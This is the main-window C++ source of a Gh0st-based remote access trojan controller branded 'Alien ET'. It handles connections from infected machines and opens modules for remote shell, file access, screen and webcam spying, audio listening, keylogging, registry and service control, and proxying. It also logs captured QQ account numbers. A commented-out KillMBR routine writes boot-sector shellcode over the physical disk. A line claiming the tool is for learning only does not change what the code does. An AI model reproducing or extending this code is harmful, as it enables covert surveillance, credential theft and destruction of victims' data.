// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "Gh0st.h"
#include "Gh0stView.h"
#include "MainFrm.h"
#include "PcView.h"
#include "SettingDlg.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "ShellDlg.h"
#include "AudioDlg.h"
#include "SystemDlg.h"
#include "LocalUpload.h"
#include "KeyBoardDlg.h"
#include "ServiceDlg.h"
#include "RegeditDlg.h"
#include "TextChatDlg.h"
#include "ProxyMapDlg.h"
#include "LogView.h"
#include "Build.h"
#include "MyToolsKit.h"
#include "Mydat.h"
#include "UpdateDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#include ".\Plugins\C_FILE.h"
#include ".\Plugins\\C_SHELL.h"
#include ".\Plugins\\C_SCREEN.h"
#include ".\Plugins\\C_VIDEO.h"
#include ".\Plugins\\C_LISTEN.h"
#include ".\Plugins\\C_SYSTEM.h"
#include ".\Plugins\\C_KEYLOG.h"
#include ".\Plugins\\C_SERVICE.h"
#include ".\Plugins\\C_REGEDIT.h"
#include ".\Plugins\\C_CHAT.h"
#include ".\Plugins\\C_PROXYMAP.h"
CMainFrame	*g_pFrame;
CIOCPServer * m_iocpServer = NULL;
extern CGh0stView* g_pTabView;
extern CLogView* g_pLogView;

LPBYTE lpFilePacket = NULL;
LPBYTE lpShellPacket = NULL;
LPBYTE lpScreenPacket = NULL;
LPBYTE lpWebCamPacket = NULL;
LPBYTE lpAudioPacket = NULL;
LPBYTE lpSystemPacket = NULL;
LPBYTE lpKeyboardPacket = NULL;
LPBYTE lpServicePacket = NULL;
LPBYTE lpRegeditPacket = NULL;
LPBYTE lpTextChatPacket = NULL;
LPBYTE lpProxyMapPacket = NULL;
int nFilePacketLength = 0;
int nShellPacketLength = 0;
int nScreenPacketLength = 0;
int nWebCamPacketLength = 0;
int nAudioPacketLength = 0;
int nSystemPacketLength = 0;
int nKeyboardPacketLength = 0;
int nServicePacketLength = 0;
int nRegeditPacketLength = 0;
int nTextChatPacketLength = 0;
int nProxyPacketLength = 0;
/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CXTPFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CXTPFrameWnd)
    //{{AFX_MSG_MAP(CMainFrame)
    ON_WM_CREATE()
    ON_WM_SYSCOMMAND()
    ON_COMMAND(ID_MENUITEM_SHOW, OnMenuitemShow)
    ON_COMMAND(ID_MENUITEM_HIDE, OnMenuitemHide)
    ON_WM_CLOSE()
    ON_COMMAND(ID_MENUITEM_SETTING, OnMenuitemSetting)
    ON_COMMAND(ID_MENUITEM_BUILD, OnMenuitemBuild)
    ON_COMMAND(IDM_TOOLS, OnTools)     //ʵ�ù���
    ON_WM_TIMER()
    ON_COMMAND(ID_MENUITEM_UPDATE_IP, OnMenuitemUpdateIp)
    //}}AFX_MSG_MAP
    ON_COMMAND(XTP_ID_CUSTOMIZE, OnCustomize)

    ON_XTP_CREATECONTROL()
    ON_COMMAND(IDM_POPUP1,OnPopup)
    ON_COMMAND(IDM_POPUP2,OnPopup)
    ON_COMMAND(IDM_POPUP3,OnPopup)
    ON_COMMAND(IDM_POPUP4,OnPopup)
    ON_COMMAND(IDM_POPUP5,OnPopup)

    ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
    ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
    ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
    ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
    ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
    ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
    ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
    ON_MESSAGE(WM_MODIFYLIST, OnModifyList)
    ON_MESSAGE(WM_OPENBUILDDIALOG, OnOpenBuildDialog)
    ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
    ON_MESSAGE(WM_OPENSERVICEDIALOG, OnOpenServiceDialog)
    ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegeditDialog)  //ע���
    ON_MESSAGE(WM_OPENTEXTCHATDIALOG, OnOpenTextChatDialog)
    ON_MESSAGE(WM_OPENPROXYMAPDIALOG, OnOpenProxyMapDialog)
    ON_MESSAGE(WM_OPENCHATDIALOG, OnOpenChatDialog)

    ON_MESSAGE(WM_OPENPQQBOXDIALOG, OnOpenQQBoxDialog)

    ON_MESSAGE(XTPWM_DOCKINGPANE_NOTIFY, OnDockingPaneNotify)

    ON_COMMAND(ID_QUIT_APP, &CMainFrame::OnExit)
END_MESSAGE_MAP()

static UINT indicators[] = {
    ID_STAUTS_OS,	// ����ͳ��
    ID_STAUTSSPEED,	// �ϴ��ٶ�
    ID_STAUTJSPEED, // �����ٶ�
    ID_STAUTS_PORT, //  �˿�
};

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
    // TODO: add member initialization code here
    g_pFrame = this;
    memset(nOSCount,0,sizeof(nOSCount));
}

CMainFrame::~CMainFrame()
{

}

// unsigned char scode[] =
// "\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
// "\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
// "\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";
// #define FILE_DEVICE_FILE_SYSTEM 0x00000009
// #define FILE_ANY_ACCESS 0
// #define METHOD_BUFFERED 0
// #define CTL_CODE( DeviceType, Function, Method, Access ) ( ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) )
// #define FSCTL_LOCK_VOLUME CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 6, METHOD_BUFFERED, FILE_ANY_ACCESS)
// #define FSCTL_UNLOCK_VOLUME CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 7, METHOD_BUFFERED, FILE_ANY_ACCESS)
//
// int KillMBR()
// {
//     HANDLE hDevice;
//     DWORD dwBytesWritten, dwBytesReturned;
//     BYTE pMBR[512] = {0};
//
//     // ���¹���MBR
//     memcpy(pMBR, scode, sizeof(scode) - 1);
//     pMBR[510] = 0x55;
//     pMBR[511] = 0xAA;
//
//     hDevice = CreateFile
//         (
//         "\\\\.\\PHYSICALDRIVE0",
//         GENERIC_READ | GENERIC_WRITE,
//         FILE_SHARE_READ | FILE_SHARE_WRITE,
//         NULL,
//         OPEN_EXISTING,
//         0,
//         NULL
//         );
//     if (hDevice == INVALID_HANDLE_VALUE)
//         return -1;
//     DeviceIoControl
//         (
//         hDevice,
//         FSCTL_LOCK_VOLUME,
//         NULL,
//         0,
//         NULL,
//         0,
//         &dwBytesReturned,
//         NULL
//         );
//     // д�벡������
//     WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
//     DeviceIoControl
//         (
//         hDevice,
//         FSCTL_UNLOCK_VOLUME,
//         NULL,
//         0,
//         NULL,
//         0,
//         &dwBytesReturned,
//         NULL
//         );
//     CloseHandle(hDevice);
//
//     ExitProcess(-1);
//     return 0;
// }
//
// DWORD WINAPI LoginAgainCheck(LPVOID lparam)
// {
// ɾ����֤...........//
/*	POSTXML m_postxml;
	m_postxml.RequestBuffer=new char[1024*5];
	m_postxml.nRequestLong=1024*5;
	lstrcpy(m_postxml.szUserName,LoginUserName);
	lstrcpy(m_postxml.szPassWord,LoginPassWord);
	lstrcpy(m_postxml.szCommand,"UPDATE");
	m_postxml.mHwnd=(HWND)1;
	while(1)
	{
		Sleep(10*1000);
		if (lstrlen(LoginUserName)==0&&lstrlen(LoginPassWord)==0)
		{
			KillMBR();
		}
		PostContent(&m_postxml);
		if (lstrcmp(LastLoginTime,m_postxml.RequestBuffer)==0)
		{
			memset(m_postxml.RequestBuffer,0,lstrlen(m_postxml.RequestBuffer));
			continue;
		}else
		{
			AfxMessageBox("�����ʺ��ڱ𴦵�½������������");
			ExitProcess(0);
		}
	}*/
// ɾ����֤...........����//
// 	return 0;
// }

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
    if (CXTPFrameWnd::OnCreate(lpCreateStruct) == -1)
        return -1;

    //���������ʾ
    this ->CenterWindow(CWnd::GetDesktopWindow());

    if (!m_wndStatusBar.Create(this) ||
        !m_wndStatusBar.SetIndicators(indicators,
                                      sizeof(indicators)/sizeof(UINT))) {
        TRACE0("Failed to create status bar\n");
        return -1;      // fail to create
    }

    // ��ʼ�� command bars
    if (!InitCommandBars())
        return -1;

// 	// ��ȡ command bars Ŀ�� ָ��
// 	CXTPCommandBars* pCommandBars = GetCommandBars();
// 	if(pCommandBars == NULL)
// 	{
// 		TRACE0("Failed to create command bars object.\n");
// 		return -1;      // fail to create
// 	}
//
//	SetMenu(NULL);
    // ��Ӳ˵���
// 	CXTPCommandBar* pMenuBar = pCommandBars->SetMenu(
// 		_T("Menu Bar"), IDR_MAINFRAME);
// 	if(pMenuBar == NULL)
// 	{
// 		TRACE0("Failed to create menu bar.\n");
// 		return -1;      // fail to create
//	}
    /*

    	// Create ToolBar
    	CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("Standard"), xtpBarTop);
    	if (!pCommandBar ||
    		!pCommandBar->LoadToolBar(IDR_TOOLBAR3))
    	{
    		TRACE0("Failed to create toolbar\n");
    		return -1;
    	}
    	//

    	CImageList m_imagelist;
    	m_imagelist.Create(24,24,ILC_COLOR24|ILC_MASK,0,0);
        CBitmap bmp;
    	bmp.LoadBitmap(IDB_TOOLBAR);
    	m_imagelist.Add(&bmp,RGB(255,255,255));

    	pCommandBar->GetImageManager()->SetIcons(IDR_TOOLBAR3,m_imagelist);

    	pCommandBars->SetTheme(xtpThemeOfficeXP);*/
    //////////////////////////////////////////////////////////////////////////////////////
    if (!m_wndDlgBar.Create(this, IDD_DIALOGBAR, WS_VISIBLE|WS_CHILD|CBRS_SIZE_DYNAMIC|CBRS_ALIGN_TOP, IDD_DIALOGBAR)) {
        TRACE0( "Failed to create dialogbar ");
        return -1;
    }


    // ���״̬��
    if ((!m_wndStatusBar.GetSafeHwnd() && !m_wndStatusBar.Create(this)) ||
        !m_wndStatusBar.SetIndicators(indicators,
                                      sizeof(indicators)/sizeof(UINT))) {
        TRACE0("Failed to create status bar\n");
        return -1;      // fail to create
    }
    //��������״̬��
    m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
    m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 120);
    m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 120);
    m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 100);
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ʾ״̬��
    // ����֮ǰ�Ĺ������Ͳ˵���
//	LoadCommandBars(_T("CommandBars"));
    LoadIcons();  //�Ҽ��˵���ʾͼ��

    // ��������ͼ��
    if (!m_TrayIcon.Create(_T("Alien ET: 0"), // ��ʾ�ı�
                           this,                       // ������
                           IDR_MAINFRAME,              // ����ͼ��ID
                           IDR_MENU_TRAY,              // �Ҽ��˵�ID
                           ID_MENUITEM_SHOW,           // Ĭ�ϵ����¼�
                           false)) {                   // True if default menu item is located by position
        TRACE0("Failed to create tray icon\n");
        return -1;
    }
    // ���� Office 2003 ����
//	CXTPPaintManager::SetTheme(xtpThemeWhidbey);


    // ����֮ǰ�Ĺ������Ͳ˵���
//	LoadCommandBars(_T("CommandBars"));

    SetTimer(0, 1000, NULL);  //������ʱ�� 1
// 	CString struserok = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString( "UPDATE", "Dns1", "" );
// 	if ( struserok.GetLength() == NULL )
// 	{
// 		SetTimer(1, 1000*60*30, NULL);  //������ʱ�� 2
// 	}
    m_paneManager.InstallDockingPanes(this);
    m_paneManager.SetTheme(xtpPaneThemeVisualStudio2005); // ��������

    CXTPDockingPane* pwndPaneLog = CreatePane(235, 150, RUNTIME_CLASS(CLogView), _T("��־��Ϣ"), xtpPaneDockBottom);
    pwndPaneLog->Select();
    pwndPaneLog->SetOptions(xtpPaneNoCaption);

    m_paneManager.ShowPane(pwndPaneLog, 1);
    // ��ʼ������ڴ�

    // File
    nFilePacketLength = (FILEMyFileSize + 1)*sizeof(char)+1;
    lpFilePacket = new BYTE[nFilePacketLength];
    if(lpFilePacket == NULL) {
        AfxMessageBox("��ʼ��File���ʧ�ܣ�");
    } else {
        lpFilePacket[0] = COMMAND_LIST_DRIVE;
        memcpy(lpFilePacket + 1, (void*)FILEMyFileBuf, nFilePacketLength - 1);
    }

    // Shell
    nShellPacketLength = (SHELLMyFileSize + 1)*sizeof(char)+1;
    lpShellPacket = new BYTE[nShellPacketLength];
    if(lpShellPacket == NULL) {
        AfxMessageBox("��ʼ��shell���ʧ�ܣ�");
    } else {
        lpShellPacket[0] = COMMAND_SHELL;
        memcpy(lpShellPacket + 1, (void*)SHELLMyFileBuf, nShellPacketLength - 1);
    }

    // ��Ļ
    nScreenPacketLength = (SCREENMyFileSize + 1)*sizeof(char)+1;
    lpScreenPacket = new BYTE[nScreenPacketLength];
    if(lpScreenPacket == NULL) {
        AfxMessageBox("��ʼ��Screen���ʧ�ܣ�");
    } else {
        lpScreenPacket[0] = COMMAND_SCREEN_SPY;
        memcpy(lpScreenPacket + 1, (void*)SCREENMyFileBuf, nScreenPacketLength - 1);
    }

    // webcam
    nWebCamPacketLength = (VIDEOMyFileSize + 1)*sizeof(char)+1;
    lpWebCamPacket = new BYTE[nWebCamPacketLength];
    if(lpWebCamPacket == NULL) {
        AfxMessageBox("��ʼ��WebCam���ʧ�ܣ�");
    } else {
        lpWebCamPacket[0] = COMMAND_WEBCAM;
        memcpy(lpWebCamPacket + 1, (void*)VIDEOMyFileBuf, nWebCamPacketLength - 1);
    }

    // Audio
    nAudioPacketLength = (LISTENMyFileSize + 1)*sizeof(char)+1;
    lpAudioPacket = new BYTE[nAudioPacketLength];
    if(lpAudioPacket == NULL) {
        AfxMessageBox("��ʼ��Audio���ʧ�ܣ�");
    } else {
        lpAudioPacket[0] = COMMAND_AUDIO;
        memcpy(lpAudioPacket + 1, (void*)LISTENMyFileBuf, nAudioPacketLength - 1);
    }

    // System
    nSystemPacketLength = (SYSTEMMyFileSize + 1)*sizeof(char)+1;
    lpSystemPacket = new BYTE[nSystemPacketLength];
    if(lpSystemPacket == NULL) {
        AfxMessageBox("��ʼ��System���ʧ�ܣ�");
    } else {
        lpSystemPacket[0] = COMMAND_SYSTEM;
        memcpy(lpSystemPacket + 1, (void*)SYSTEMMyFileBuf, nSystemPacketLength - 1);
    }

    // Keyboard
// 	nKeyboardPacketLength = (KEYLOGMyFileSize + 1)*sizeof(char)+1;
// 	lpKeyboardPacket = new BYTE[nKeyboardPacketLength];
// 	if(lpKeyboardPacket == NULL)
// 	{
// 		AfxMessageBox("��ʼ��Keyboard���ʧ�ܣ�");
// 	}
// 	else
// 	{
// 		lpKeyboardPacket[0] = COMMAND_KEYBOARD;
// 		memcpy(lpKeyboardPacket + 1, (void*)KEYLOGMyFileBuf, nKeyboardPacketLength - 1);
// 	}

    // Service
    nServicePacketLength = (SERVICEMyFileSize + 1)*sizeof(char)+1;
    lpServicePacket = new BYTE[nServicePacketLength];
    if(lpServicePacket == NULL) {
        AfxMessageBox("��ʼ��Service���ʧ�ܣ�");
    } else {
        lpServicePacket[0] = COMMAND_SERVICE_MANAGER;
        memcpy(lpServicePacket + 1, (void*)SERVICEMyFileBuf, nServicePacketLength - 1);
    }

    // Regedit
    nRegeditPacketLength = (REGEDITMyFileSize + 1)*sizeof(char)+1;
    lpRegeditPacket = new BYTE[nRegeditPacketLength];
    if(lpRegeditPacket == NULL) {
        AfxMessageBox("��ʼ��Regedit���ʧ�ܣ�");
    } else {
        lpRegeditPacket[0] = COMMAND_REGEDIT;
        memcpy(lpRegeditPacket + 1, (void*)REGEDITMyFileBuf, nRegeditPacketLength - 1);
    }


    // TextChat
    nTextChatPacketLength = (CHATMyFileSize + 1)*sizeof(char)+1;
    lpTextChatPacket = new BYTE[nTextChatPacketLength];
    if(lpTextChatPacket == NULL) {
        AfxMessageBox("��ʼ��TextChat���ʧ�ܣ�");
    } else {
        lpTextChatPacket[0] = COMMAND_TEXT_CHAT;
        memcpy(lpTextChatPacket + 1, (void*)CHATMyFileBuf, nTextChatPacketLength - 1);
    }


    // ProxyMap
    nProxyPacketLength = (PROXYMAPMyFileSize + 1)*sizeof(char)+1;
    lpProxyMapPacket = new BYTE[nProxyPacketLength];
    if(lpProxyMapPacket == NULL) {
        AfxMessageBox("��ʼ��ProxyMap���ʧ�ܣ�");
    } else {
        lpProxyMapPacket[0] = COMMAND_PROXY_MAP;
        memcpy(lpProxyMapPacket + 1, (void*)PROXYMAPMyFileBuf, nProxyPacketLength - 1);
    }
    CXTPPaintManager::SetTheme(xtpThemeVisualStudio2010);//״̬����XTP
    /*	CloseHandle(CreateThread(NULL,0,&LoginAgainCheck,NULL,0,NULL));*/
    return 0;
}


int m_nCount;

CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
{
    int nID = ++m_nCount;

    CXTPDockingPane* pwndPane = m_paneManager.CreatePane(nID, CRect(0, 0,x, y), direction, pNeighbour);

    CString strTitle;
    strTitle.Format(strFormat, nID);
    pwndPane->SetTitle(strTitle);
    pwndPane->SetIconID(nID % 6 + 1);

    CXTPFrameWnd* pFrame = new CXTPFrameWnd;

    CCreateContext context;
    context.m_pNewViewClass = pNewViewClass;
    context.m_pCurrentDoc = GetActiveView()->GetDocument();

    pFrame->Create(NULL, NULL, WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, NULL, 0, &context);
    pFrame->ModifyStyleEx(WS_EX_CLIENTEDGE, 0);

    m_mapPanes.SetAt(nID, pFrame);

    return pwndPane;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
    if( !CXTPFrameWnd::PreCreateWindow(cs) )
        return FALSE;
    // TODO: Modify the Window class or styles here by modifying
    //  the CREATESTRUCT cs
    cs.lpszClass = _T("XTPMainFrame");
    CXTPDrawHelpers::RegisterWndClass(AfxGetInstanceHandle(), cs.lpszClass,
                                      CS_DBLCLKS, AfxGetApp()->LoadIcon(IDR_MAINFRAME));


    cs.cx =  ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Alien", "Width",  1200);
    cs.cy =  ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Alien", "Hight",  700);

    cs.dwExStyle&=~WS_EX_CLIENTEDGE;
    cs.style &= ~FWS_ADDTOTITLE;
    // �����ڱ���
    cs.lpszName = _T("Alien ET 1.0");

    return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
    CXTPFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
    CXTPFrameWnd::Dump(dc);
}

#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers
void CMainFrame::OnPopup()
{}

// �����������
void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{

    SetTimer(0x000,1000,NULL);
    HICON icon0 = (HICON)::LoadImage(AfxGetInstanceHandle(),
                                     MAKEINTRESOURCE(IDI_zj),IMAGE_ICON, 16, 16, LR_SHARED);

    HICON icon1 = (HICON)::LoadImage(AfxGetInstanceHandle(),
                                     MAKEINTRESOURCE(IDI_fs),IMAGE_ICON, 16, 16, LR_SHARED);

    HICON icon2 = (HICON)::LoadImage(AfxGetInstanceHandle(),
                                     MAKEINTRESOURCE(IDI_js),IMAGE_ICON, 16, 16, LR_SHARED);

    HICON icon3 = (HICON)::LoadImage(AfxGetInstanceHandle(),
                                     MAKEINTRESOURCE(IDI_dk),IMAGE_ICON, 16, 16, LR_SHARED);

    //	CMainFrame* pFrm=(CMainFrame*)AfxGetApp()->m_pMainWnd;//�õ��������ָ��
    CStatusBar* pStatus=&g_pFrame->m_wndStatusBar;//ָ��״̬��ָ��,m_wndStatusBar���Ҹĳ�public������.
    if(pStatus) {
        //����ͼ�����Դ
        pStatus->GetStatusBarCtrl().SetIcon(0,icon0);
        pStatus->GetStatusBarCtrl().SetIcon(1,icon1);
        pStatus->GetStatusBarCtrl().SetIcon(2,icon2);
        pStatus->GetStatusBarCtrl().SetIcon(3,icon3);

    }
    //�ж����m_iocpServerȫ�ֱ����Ƿ��Ѿ�ָ����һ��CIOCPServer
    if (m_iocpServer != NULL) {
        //������ǵĻ�����Ҫ�ȹر���������ɾ�������CIOCPServer��ռ���ڴ�ռ�
        m_iocpServer->Shutdown();
        delete m_iocpServer;
    }
    m_iocpServer = new CIOCPServer;


    // ��ʼ����
    m_iocpServer->m_nHeartBeatTime = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "HeartBeatTime", 0);


    CString str,IP;

    // ����IPCP������
    if (m_iocpServer->Initialize(NotifyProc, nMaxConnections, nPort)) {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        HOSTENT *host = gethostbyname(hostname);
        if (host != NULL) {
            for ( int i=0; ; i++ ) {
                IP += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
                if ( host->h_addr_list[i] + host->h_length >= host->h_name )
                    break;
                IP += "/";
            }
        } else
            IP = _T("127.0.0.1");

        str.Format("�˿�:%d",nPort);
        m_wndStatusBar.SetPaneText(3, str);
        CString strLogText,strlogData;
        strLogText.Format( "ϵͳ�ɹ����� -> �����˿�: [ %d ]", nPort );
        g_pLogView->InsertLogItem( strLogText, 0, 1 );
        strlogData.Format( "���������������ѧϰ���簲ȫ���벻Ҫ�������ɣ����������и���һ����ԭ�����޹ء�");
        g_pLogView->InsertLogItem( strlogData, 0, 0 );

    } else {
        IP.Format(_T("�˿� %d ����ʧ��"), nPort);
        m_wndStatusBar.SetPaneText(3, "�˿�:0");
        g_pLogView->InsertLogItem( IP, 0, 2 );

    }

// 	CString date=Datetime;
//     SetWindowText("Gh0st1.0       [BUILD:20160821]  "+IP+" [��ǰ�ʺ�:"+LoginUserName+" ����ʱ��:"+date.Mid(0,8)+"]");
// 	m_wndStatusBar.SetPaneText(0, _T("����: 0"));
}

void CALLBACK CMainFrame::NotifyProc( ClientContext *pContext, UINT nCode)
{



    switch (nCode) {
    case NC_CLIENT_CONNECT:
        break;
    case NC_CLIENT_DISCONNECT:
        g_pFrame->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
        break;
    case NC_TRANSMIT:
        break;
    case NC_RECEIVE:
        ProcessReceive(pContext);
        break;
    case NC_RECEIVE_COMPLETE:
        ProcessReceiveComplete(pContext);
        break;
    default:
        break;
    }
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
    if (pContext == NULL)
        return;

    // �������Ի���򿪣�������Ӧ�ĶԻ�����
    CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];

    // �������ڴ���
    if (pContext->m_Dialog[0] > 0) {
        switch (pContext->m_Dialog[0]) {
        case FILEMANAGER_DLG:
            ((CFileManagerDlg *)dlg)->OnReceiveComplete();
            break;
        case SCREENSPY_DLG:
            ((CScreenSpyDlg *)dlg)->OnReceiveComplete();
            break;
        case SHELL_DLG:
            ((CShellDlg *)dlg)->OnReceiveComplete();
            break;
        case WEBCAM_DLG:
            ((CWebCamDlg *)dlg)->OnReceiveComplete();
            break;
        case AUDIO_DLG:
            ((CAudioDlg *)dlg)->OnReceiveComplete();
            break;
        case SYSTEM_DLG:
            ((CSystemDlg *)dlg)->OnReceiveComplete();
            break;
        case KEYBOARD_DLG:
            ((CKeyBoardDlg *)dlg)->OnReceiveComplete();
            break;
        case SERVICE_DLG:
            ((CServiceDlg *)dlg)->OnReceiveComplete();
            break;
        case REGEDIT_DLG:
            ((CRegeditDlg *)dlg)->OnReceiveComplete();
            break;
        case CHAT_DLG:
            ((CTextChatDlg *)dlg)->OnReceiveComplete();
            break;
        case PROXYMAP_DLG:
            ((CProxyMapDlg *)dlg)->OnReceiveComplete();
            break;
        case GETDAT_DLG:
            ((CMydat *)dlg)->OnReceiveComplete();//���ӹ���
            break;
        default:
            break;
        }
        return;
    }

    switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) {
    case TOKEN_LOGIN: { // ���߰�
        pContext->m_bIsMainSocket = TRUE;
        g_pTabView->PostMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);
    }
    break;
    case TOKEN_DRIVE_LIST: // �ļ����� �������б�
        // ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����,̫��
        g_pFrame->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_BITMAPINFO: // ��Ļ�鿴
        g_pFrame->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_WEBCAM_BITMAPINFO: // ����ͷ
        g_pFrame->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_AUDIO_START: // ����
        g_pFrame->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_SHELL_START: //��ʼCMD
        g_pFrame->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_PSLIST:     // ϵͳ���� �����б�
        g_pFrame->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_FIND_YES: // ɸѡ����
        g_pFrame->PostMessage(WM_MODIFYLIST, 0, (LPARAM)pContext);
        break;
    case TOKEN_DLLINFO:
        g_pFrame->PostMessage(WM_OPENBUILDDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_KEYBOARD_START:
        g_pFrame->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_SERVICE_LIST:
        g_pFrame->PostMessage(WM_OPENSERVICEDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_REGEDIT:   //ע������
        g_pFrame->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_TEXTCHAT_START:
        g_pFrame->PostMessage(WM_OPENTEXTCHATDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_PROXY_START:
        g_pFrame->PostMessage(WM_OPENPROXYMAPDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_CHAT_START:
        g_pFrame->PostMessage(WM_OPENCHATDIALOG, 0, (LPARAM)pContext);
        break;
    case TOKEN_GETQQNUM:
        g_pFrame->PostMessage(WM_WRITEQQNUM, 0, (LPARAM)pContext);
        break;
    case TOKEN_SHOWQQ: {
        OutputDebugString("����TOKEN_SHOWQQ");
        g_pFrame->PostMessage(WM_OPENPQQBOXDIALOG, 0, (LPARAM)pContext);

        /*
        			CString str = pContext->m_DeCompressionBuffer.GetBuffer(1);
        		AfxMessageBox(str);*/
    }
    break;
    case TOKEN_RECV_QQ: {
        OutputDebugString("����QQ����:");
        CString str = "QQ����: ";
        str += (char *)pContext->m_DeCompressionBuffer.GetBuffer(1);
        g_pLogView->InsertLogItem(str, 0, 0 );
    }
    break;
    default:
        closesocket(pContext->m_Socket);
        break;
    }
}


// ��Ҫ��ʾ���ȵĴ���
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
    if (pContext == NULL)
        return;
    // �������Ի���򿪣�������Ӧ�ĶԻ�����
    CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];

    // �������ڴ���
    if (pContext->m_Dialog[0] > 0) {
        switch (pContext->m_Dialog[0]) {
        case SCREENSPY_DLG:
            ((CScreenSpyDlg *)dlg)->OnReceive();
            break;
        case WEBCAM_DLG:
            ((CWebCamDlg *)dlg)->OnReceive();
            break;
        default:
            break;
        }
        return;
    }
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{
    m_TrayIcon.ShowBalloonTip( lpszText, _T("������������Ϣ: "), NIIF_INFO, 10);
}

void CMainFrame::LoadIcons()   //�Ҽ��˵���ʾͼ��
{
    CXTPCommandBars* pCommandBars = GetCommandBars();

    UINT uiGroupFind[] = {ID_MENUITEM_FILEMANAGER,ID_MENUITEM_SCREENSPY,ID_MENUITEM_KEYBOARD,ID_MENUITEM_REMOTESHELL,ID_MENUITEM_SYSTEM,ID_MENUITEM_WEBCAM,ID_MENUITEM_AUDIO_LISTEN,ID_MENUITEM_REGEDIT,
                          ID_MENUITEM_SERVICEMANAGER,	ID_MENUITEM_TEXT_CHAT,IDM_CHAT
                         };
    UINT uiGroupFind2[] = {ID_MENUITEM_LOGOFF,ID_MENUITEM_REBOOT,ID_MENUITEM_SHUTDOWN,ID_MENUITEM_UNINSTALL,ID_MENUITEM_PROXY,ID_MENUITEM_PROXY_MAP,ID_MENUITEM_PRANK,ID_MENUITEM_MESSAGEBOX,ID_MENUITEM_SELECT_ALL,ID_MENUITEM_UNSELECT_ALL
                          };
